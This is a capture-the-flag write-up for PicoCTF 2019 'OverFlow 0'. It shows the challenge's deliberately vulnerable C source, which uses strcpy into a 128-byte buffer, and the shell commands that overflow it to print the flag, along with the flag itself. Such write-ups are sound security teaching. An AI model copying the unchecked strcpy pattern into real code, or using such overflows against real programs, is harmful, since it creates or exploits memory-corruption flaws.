# PicoCTF19 OverFlow 0

## Challenge

This should be easy. Overflow the correct buffer in this [program](https://2019shell1.picoctf.com/static/1730bdc8ccd557c8ff20d1c28a5c3dbe/vuln) and get a flag. Its also found in /problems/overflow-0 on the shell server. [Source](https://2019shell1.picoctf.com/static/1730bdc8ccd557c8ff20d1c28a5c3dbe/vuln.c).

## Hints

Find a way to trigger the flag to print.

If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.

## Solution

Let's view that directory:

```bash
samson@pico-2019-shell1:/problems/overflow-0$ ls -al
total 92
drwxr-xr-x   2 root       root          4096 Sep 28 21:54 .
drwxr-x--x 684 root       root         69632 Oct 10 18:02 ..
-r--r-----   1 hacksports overflow-0_4    27 Sep 28 21:54 flag.txt
-rwxr-sr-x   1 hacksports overflow-0_4  7644 Sep 28 21:54 vuln
-rw-rw-r--   1 hacksports hacksports     814 Sep 28 21:54 vuln.c
```

Let's view `vuln.c`

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[128];
  strcpy(buf, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc > 1) {
    vuln(argv[1]);
    printf("You entered: %s", argv[1]);
  }
  else
    printf("Please enter an argument next time\n");
  return 0;
}
```
It seems to take in an input, copy that input into a buffer of size 128 and then print it back out to you.

There's also a `SIGSEGV` signal handler which will fire after any segmentation fault which happens when you try to access memory that doesn't belong to the program. So my first assumption would be to pass in 129 bytes to the program see how the program responds and if it will print the flag.

```bash
samson@pico-2019-shell1:/problems/overflow-0$ ./vuln $(python -c "print 'A'*128")
You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

```bash
samson@pico-2019-shell1:/problems/overflow-0$ ./vuln $(python -c "print 'A'*132")
You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

```bash
samson@pico-2019-shell1:/problems/overflow-0$ ./vuln $(python -c "print 'A'*133")
picoCTF{3asY_P3a5y2f814ddc}
```

Odd it needed more than 4 more bytes to fail. Will need to determine why later

## Flag

`picoCTF{3asY_P3a5y2f814ddc}`